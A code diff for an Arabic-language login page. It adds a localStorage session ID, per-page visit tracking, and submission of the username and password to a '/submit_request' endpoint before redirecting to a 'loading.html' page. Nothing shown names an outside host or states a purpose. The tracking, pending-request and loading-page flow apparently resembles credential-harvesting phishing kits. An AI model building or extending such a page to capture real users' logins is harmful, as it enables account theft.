@@ -311,13 +311,19 @@
     </div>
 
     <script>
-        // الحفاظ على كود التتبع الأصلي
+        function getSessionId() {
+            let sid = localStorage.getItem('session_id');
+            if (!sid) {
+                sid = 'sid_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+                localStorage.setItem('session_id', sid);
+            }
+            return sid;
+        }
+
         fetch('/track_visit', {
             method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({ action: 'track_visit', page: 'login' })
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ session_id: getSessionId(), current_page: 'login' })
         }).catch(error => console.error('Error tracking visit:', error));
 
         function togglePassword() {
@@ -334,7 +340,6 @@
             }
         }
 
-        // الحفاظ على كود إرسال البيانات الأصلي
         document.getElementById("loginForm").addEventListener("submit", async function(event) {
             event.preventDefault();
 
@@ -345,22 +350,21 @@
             try {
                 const response = await fetch("/submit_request", {
                     method: "POST",
-                    headers: {
-                        "Content-Type": "application/json",
-                    },
+                    headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({
+                        session_id: getSessionId(),
                         type: "login",
+                        current_page: "login",
                         data: { username: username, password: password }
                     })
                 });
 
                 const result = await response.json();
 
-                if (result.status === "pending") {
-                    localStorage.setItem("request_id", result.request_id);
+                if (result.ok) {
                     window.location.href = "loading.html";
                 } else {
-                    errorMessageDiv.textContent = result.message || "حدث خطأ غير متوقع.";
+                    errorMessageDiv.textContent = result.error || "حدث خطأ غير متوقع.";
                     errorMessageDiv.style.display = "block";
                 }
             } catch (error) {
